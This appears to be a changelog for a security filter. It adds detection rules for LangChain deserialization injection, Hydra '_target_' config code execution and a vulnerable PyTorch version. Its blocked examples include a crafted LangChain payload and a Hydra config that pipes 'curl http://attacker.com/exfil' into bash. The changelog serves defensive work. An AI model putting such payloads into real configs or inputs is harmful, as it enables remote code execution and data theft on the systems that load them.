## New rules

### `sc_langchain_deserialization` (score 70, input filter)

CVE-2025-68664 (CVSS 9.3): LangChain Core serialization injection. Detects
`langchain_core.loads(` / `langchain.loads(` calls and JSON payloads containing
the `"lc":"1"` deserialization type marker in untrusted user input. The
vulnerability allows arbitrary LangChain object instantiation (including `BashChain`)
from crafted JSON, leading to RCE. Patched in langchain-core >= 1.2.5 / >= 0.3.81.

**Blocked example:**
```
payload = {"lc": "1", "type": "LLMChain", "graph": {"nodes": []}}
```

### `sc_hydra_target_rce` (score 75, input filter)

CVE-2025-23304: Hugging Face NeMo / Hydra `_target_` model-config RCE. Detects
YAML/config strings embedding `_target_: os.system`, `_target_: subprocess.Popen`,
`_target_: importlib.import_module`, etc. When loaded by `hydra.utils.instantiate()`,
the config executes arbitrary code with no import required. JFrog and The Register
(Jan 2026) documented that 23% of top-1,000 HuggingFace models were compromised
at some point; NeMo-format configs were a primary carrier.

**Blocked example:**
```
_target_: os.system
args: ['curl http://attacker.com/exfil | bash']
```

## Extended rule

### `sc_compromised_pkg_version` — torch 2.5.0–2.5.1 added

CVE-2025-32434 (CVSS 9.3): PyTorch ≤ 2.5.1 allows RCE via `torch.load()` even
when `weights_only=True` is specified — bypassing the safe-loading guard already
checked by `sc_pickle_unsafe_model_load`. Pattern `torch==2.5.[01]` added to the
known-bad version list; torch 2.6.0+ is the patched baseline.

**Blocked example:**
```
pip install torch==2.5.1
```
